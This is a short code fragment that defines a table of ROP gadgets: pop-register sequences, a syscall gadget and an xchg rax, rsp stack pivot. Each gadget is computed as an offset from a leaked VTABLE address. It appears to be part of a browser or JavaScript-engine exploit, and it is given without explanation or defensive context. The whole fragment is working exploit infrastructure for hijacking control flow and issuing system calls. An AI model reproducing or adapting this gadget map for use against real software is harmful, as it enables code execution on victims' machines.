gadgets = {
  'xchg rax, rsp; dec dword ptr [rax - 0x77]': new gadget(VTABLE,-0x18a353f),
  'pop rcx; pop rcx': new gadget(VTABLE,-0x5e970c),
  'pop rcx': new gadget(VTABLE,-0xab7d4c),
  'add dword ptr [rax - 0x77], ecx': new gadget(VTABLE, -0x18c3d40),
  'pop rdi': new gadget(VTABLE, -0x11d1d76),
  'mov qword ptr [rdi], rax': new gadget(VTABLE, -0x2372c99),
  'pop rsi': new gadget(VTABLE, -0x88d954),
  'pop rdx': new gadget(VTABLE, -0xac2f8e),
  'pop rax': new gadget(VTABLE, -0x5e9bfd),
  'syscall': new gadget(VTABLE, -0x3dc1a6),
  'pop rsp': new gadget(VTABLE, -0x1abc011),
  'mov rax, qword ptr [rax]': new gadget(VTABLE, -0x238e98d),
  'pop r8': new gadget(VTABLE, -0x15ca007),
  'pop r9': new gadget(VTABLE, -0x17202f1)
}
